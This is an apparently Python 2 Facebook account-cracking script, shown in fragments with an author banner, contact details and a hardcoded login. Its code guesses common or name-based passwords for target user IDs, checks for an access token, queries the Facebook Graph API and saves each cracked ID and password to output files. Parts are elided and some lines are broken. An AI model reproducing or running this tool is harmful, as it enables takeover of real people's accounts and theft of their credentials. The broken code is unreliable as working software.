...
----------------------------------------------------------
\033[1;96m AUTHOR : PITAFI QASIM 
 FACEBOOK : Qasim pitafi
 \033[1;97mLIFE STATUS : MARREID
------------------------------------------------------------
\033[1;m\033[1;97mâ€¢-----------------\033[1;37mKING-HAMIIðŸ˜ˆ\033[1;97m-----------------â€¢
 \033[1;96mBROKEN HEART ðŸ’”
\033[1;37mAuthor Name: PITAFI QASIM 
\033[1;96mWHATSAPP +923063261665
 \033[1;91mYOUTUBE  : Hamii's world 
FROM :DAD LAGHARI SINDH 
...
\033[1;97m|/     \||/     \||/     \|\_______/\_______/
       ----------------------------------------------------------
          \033[1;97mAUTHOR :PITAFI QASIM
          FACEBOOK :Qasim pitafi
         \033[1;96m BROKEN : HEART
 ----------------------------------------------------------
 """
CorrectUsername = "KING"
CorrectPassword = "qasim"
		...
		try:													
			...
			if 'access_token' in q:
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				    print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
				    ok = open("out/super_cp.txt", "a")
				    ok.write("ID:" +user+ " Pw:" +pass1+"\n")
				    ok.close()
						           ...
						           pass4 = b['first_name'] + '1122'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   ...
				                                   oks.append(user+pass4)
				                                       ...
				                                       print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
				                                       ok = open("out/super_cp.txt", "a")
				                                       ok.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       okk.close()
				                                       ok.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       ...
						                       if 'access_token' in q:	
						                               ...
						                               oks.append(user+pass5)	
				                                                   ...
				                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
				                                                   ok = open("out/super_cp.txt", "a")
				                                                   ok.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   ok.close()
				                                                   ok.append(user+pass5)					
						                               else:								
							                           pass6 = '100200'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           ...
				                                                           oks.append(user+pass6)
				                                                               ...
				                                                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
				                                                               ok = open("out/super_cp.txt", "a")
				                                                               ok.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               ok.close()
				                                                               ok.append(user+pass6)	
						                                           else:							
								                               ...
								                               if 'access_token' in q:		
									                               ...
									                               oks.append(user+pass7)
				                                                                           ...
				                                                                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
				                                                                           ok = open("out/super_cp.txt", "a")
				                                                                           ok.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           ok.close()
				                                                                           ok.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'							
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   ...
				                                                                                   oks.append(user+pass8)
				                                                                                       ...
				                                                                                       print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
				                                                                                       ok = open("out/super_ok.txt", "a")
				                                                                                       ok.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       ok.close()
				                                                                                       ok.append(user+pass8)   	
										                                   else:					
										                                       ...
										                                       if 'access_token' in q:		
											                                       ...
											                                       oks.append(user+pass9)
				                                                                                                   ...
				                                                                                                   print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
				                                                                                                   ok = open("out/super_cp.txt", "a")
				                                                                                                   ok.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   ok.close()
				                                                                                                   ok.append(user+pass9)		
...
#Dev:ROCK-17
	...
	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(ok))
	print "\033[1;97mÂ«-----------------\033[1;37mKING-HAMII\033[1;97m-----------------Â»"
	print """
 \033[1;97m
\033[1;97mKING HAMII
